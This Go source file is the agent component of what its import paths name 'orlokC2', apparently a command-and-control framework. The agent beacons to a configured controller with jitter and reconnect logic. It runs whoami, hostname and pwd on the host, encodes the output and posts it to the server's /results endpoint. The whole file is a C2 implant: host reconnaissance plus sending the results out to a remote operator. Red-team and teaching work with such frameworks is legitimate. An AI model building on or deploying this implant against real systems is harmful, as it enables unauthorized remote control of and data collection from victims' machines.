package agent

import (
	"fmt"
	"io"
	"orlokC2_final/internal/modules"
	"orlokC2_final/internal/types"
	"time"

	"orlokC2_final/internal/agent/config"
	"orlokC2_final/internal/agent/protocols"
)

// Agent manages the C2 communication
type Agent struct {
	// Configuration
	Config *config.AgentConfig

	// Protocol implementation
	Protocol protocols.Protocol

	// Control
	stopChan chan struct{}
	running  bool
}

// New creates a new Agent with the given configuration and protocol
func New(config *config.AgentConfig, protocol protocols.Protocol) *Agent {
	return &Agent{
		Config:   config,
		Protocol: protocol,
		stopChan: make(chan struct{}),
		running:  false,
	}
}

// Start begins the agent's operation in a goroutine
func (a *Agent) Start() error {
	if a.running {
		return fmt.Errorf("agent already running")
	}

	// Initialize protocol
	err := a.Protocol.Initialize(
		a.Config.TargetHost,
		a.Config.TargetPort,
		int(a.Config.ConnectionTimeout.Seconds()),
		a.Config.AgentUUID,
	)
	if err != nil {
		return fmt.Errorf("failed to initialize protocol: %v", err)
	}

	// Start main loop in a goroutine
	a.running = true
	go a.runLoop()

	fmt.Printf("Agent started with UUID: %s\n", a.Config.AgentUUID)
	return nil
}

// Stop gracefully stops the agent's operation
func (a *Agent) Stop() error {
	if !a.running {
		return fmt.Errorf("agent not running")
	}

	// Signal the loop to stop
	close(a.stopChan)
	a.running = false

	// Disconnect from server
	if err := a.Protocol.Disconnect(); err != nil {
		return fmt.Errorf("error disconnecting: %v", err)
	}

	fmt.Println("Agent stopped")
	return nil
}

// runLoop is the main agent operation loop
func (a *Agent) runLoop() {
	for {
		select {
		case <-a.stopChan:
			// Stop signal received
			return
		default:
			// Try to connect if not connected
			err := a.Protocol.Connect()
			if err != nil {
				fmt.Printf("Connection error: %v\n", err)
				time.Sleep(a.Config.ReconnectDelay)
				continue
			}

			// Send request to root endpoint
			resp, err := a.Protocol.SendRequest("/")
			if err != nil {
				fmt.Printf("Request error: %v\n", err)
				time.Sleep(a.Config.ReconnectDelay)
				continue
			}

			// Process response
			body, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err == nil {
				currentTime := time.Now().Format("2006-01-02 15:04:05.000")
				fmt.Printf("[%s] Response: %s\n", currentTime, string(body))
			}

			// Execute commands and send results
			cmdResults := []*types.CommandResult{
				ExecuteCommand("whoami", modules.GetWhoami),
				ExecuteCommand("hostname", modules.GetHostname),
				ExecuteCommand("pwd", modules.GetPwd),
			}

			// Fill in the agent UUID for each result
			for _, result := range cmdResults {
				result.AgentUUID = a.Config.AgentUUID
			}

			// Send each result to the server
			for _, result := range cmdResults {
				// Encode the result
				data, err := EncodeResult(result)
				if err != nil {
					fmt.Printf("Failed to encode result: %v\n", err)
					continue
				}

				// Send the result to the server
				_, err = a.Protocol.SendPostRequest("/results", data)
				if err != nil {
					fmt.Printf("Failed to send result: %v\n", err)
					continue
				}

				fmt.Printf("Sent %s result to server\n", result.Command)
			}

			// Sleep before next check-in
			sleepTime := a.Config.CalculateSleepWithJitter()
			time.Sleep(sleepTime)
		}
	}
}
